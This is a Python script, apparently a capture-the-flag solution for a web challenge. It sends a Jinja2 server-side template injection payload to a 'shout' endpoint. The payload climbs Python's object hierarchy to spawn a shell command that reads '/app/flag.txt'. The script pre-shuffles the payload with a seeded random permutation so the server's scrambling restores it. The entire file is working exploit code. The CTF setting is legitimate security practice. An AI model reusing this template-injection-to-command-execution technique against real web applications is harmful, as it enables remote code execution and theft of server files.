import random
import requests

payload = "{{''.__class__.mro()[1].__subclasses__()[-1]('cat /app/flag.txt',shell=True,stdout=-1).communicate()}}"
chars = [chr(x) for x in range(25,128)] # string.ascii_letters + string.digits
chars = chars[:len(payload)]
print(payload, len(payload), len(chars))

arr = {}
for idx, c in enumerate(chars):
    arr[c] = idx

text = ''.join(chars)
jumbled = list(text)

random.seed(0)
random.shuffle(jumbled)

jumbled = ''.join(jumbled)
print(jumbled)

s = [0 for _ in range(len(chars))]
i = 0 
for c in jumbled:
    s[arr[c]] = payload[i]
    i = i + 1

payload = ''.join(s)
print("exploit_code:", payload)

url = "https://winds.web.actf.co/shout"
r = requests.post(url, data={"text": payload})
print(r.text)

